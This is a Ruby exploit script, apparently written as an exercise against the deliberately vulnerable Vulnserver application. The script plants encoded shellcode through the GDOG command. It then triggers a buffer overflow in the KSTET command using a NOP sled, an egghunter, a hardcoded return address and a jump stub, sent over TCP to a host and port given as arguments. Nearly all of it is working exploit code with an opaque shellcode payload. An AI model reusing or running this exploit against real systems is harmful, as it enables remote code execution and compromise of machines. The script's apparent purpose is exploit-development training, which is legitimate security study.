#!/usr/bin/ruby
require 'socket'
require 'rex'

#run the fuzzer to find a place for our shellcode
#require './vulnserver_fuzzer'

def fuzz_str
  return Rex::Text.rand_text_alphanumeric(rand(1000))#93
end

def generate_egghunter egg
  egg_hunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8"
  egg_hunter += egg
  egg_hunter += "\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
  egg_hunter += "\x90" * 5
end

#modified his instructions to jump up higher in the buffer
def jump_to_egghunter
  #TODO remove xCC (breakpoint)
  "\x89\xe0\x83\xe8\x40\xCC\xCC\xff\xe0"
end

if ARGV.size < 2
  puts "need to give ip and port"
  return
end

egg = "PWNT"

egg_with_shellcode = "GDOG "
egg_with_shellcode += "PWNT" * 2
egg_with_shellcode += "\xCC" * 4
shell_code =
"\xba\xc5\xc4\xd4\x04\xda\xdb\xd9\x74\x24\xf4\x58\x2b\xc9" +
"\xb1\x53\x31\x50\x12\x83\xc0\x04\x03\x95\xca\x36\xf1\xe9" +
"\x3b\x34\xfa\x11\xbc\x59\x72\xf4\x8d\x59\xe0\x7d\xbd\x69" +
"\x62\xd3\x32\x01\x26\xc7\xc1\x67\xef\xe8\x62\xcd\xc9\xc7" +
"\x73\x7e\x29\x46\xf0\x7d\x7e\xa8\xc9\x4d\x73\xa9\x0e\xb3" +
"\x7e\xfb\xc7\xbf\x2d\xeb\x6c\xf5\xed\x80\x3f\x1b\x76\x75" +
"\xf7\x1a\x57\x28\x83\x44\x77\xcb\x40\xfd\x3e\xd3\x85\x38" +
"\x88\x68\x7d\xb6\x0b\xb8\x4f\x37\xa7\x85\x7f\xca\xb9\xc2" +
"\xb8\x35\xcc\x3a\xbb\xc8\xd7\xf9\xc1\x16\x5d\x19\x61\xdc" +
"\xc5\xc5\x93\x31\x93\x8e\x98\xfe\xd7\xc8\xbc\x01\x3b\x63" +
"\xb8\x8a\xba\xa3\x48\xc8\x98\x67\x10\x8a\x81\x3e\xfc\x7d" +
"\xbd\x20\x5f\x21\x1b\x2b\x72\x36\x16\x76\x1b\xfb\x1b\x88" +
"\xdb\x93\x2c\xfb\xe9\x3c\x87\x93\x41\xb4\x01\x64\xa5\xef" +
"\xf6\xfa\x58\x10\x07\xd3\x9e\x44\x57\x4b\x36\xe5\x3c\x8b" +
"\xb7\x30\xa8\x83\x1e\xeb\xcf\x6e\xe0\x5b\x50\xc0\x89\xb1" +
"\x5f\x3f\xa9\xb9\xb5\x28\x42\x44\x36\x66\xaa\xc1\xd0\xec" +
"\xdc\x87\x4b\x98\x1e\xfc\x43\x3f\x60\xd6\xfb\xd7\x29\x30" +
"\x3b\xd8\xa9\x16\x6b\x4e\x22\x75\xaf\x6f\x35\x50\x87\xf8" +
"\xa2\x2e\x46\x4b\x52\x2e\x43\x3b\xf7\xbd\x08\xbb\x7e\xde" +
"\x86\xec\xd7\x10\xdf\x78\xca\x0b\x49\x9e\x17\xcd\xb2\x1a" +
"\xcc\x2e\x3c\xa3\x81\x0b\x1a\xb3\x5f\x93\x26\xe7\x0f\xc2" +
"\xf0\x51\xf6\xbc\xb2\x0b\xa0\x13\x1d\xdb\x35\x58\x9e\x9d" +
"\x39\xb5\x68\x41\x8b\x60\x2d\x7e\x24\xe5\xb9\x07\x58\x95" +
"\x46\xd2\xd8\xa5\x0c\x7e\x48\x2e\xc9\xeb\xc8\x33\xea\xc6" +
"\x0f\x4a\x69\xe2\xef\xa9\x71\x87\xea\xf6\x35\x74\x87\x67" +
"\xd0\x7a\x34\x87\xf1"
egg_with_shellcode += shell_code

#building exploit
exploit = "KSTET ."

#69 bytes after top of buffer is where the return address is expected
#0x00B6F9C4
#exploit += "\xCC"*(69)

egghunter = generate_egghunter "PWNT"

#NOP SLEDDDDDDD should have 69 byte room
exploit += "\x90" * (69 - egghunter.size)
exploit += egghunter

#reverse the address for little endian. Select each 2 characters representing
#one byte, convert from hex to decimal, then from decimal to ascii character
exploit += "625011AF".gsub(/../).reverse_each.map {|pair| pair.hex.chr}.join
#exploit += ['AF115062'].pack('H*') #this also works

exploit += jump_to_egghunter
exploit += "CC".hex.chr*(0x14-jump_to_egghunter.size)

easter_bunny_con = TCPSocket.new ARGV[0],ARGV[1]
puts easter_bunny_con.gets
easter_bunny_con.puts egg_with_shellcode

exploit_con = TCPSocket.new ARGV[0],ARGV[1]
puts exploit_con.gets
exploit_con.puts exploit
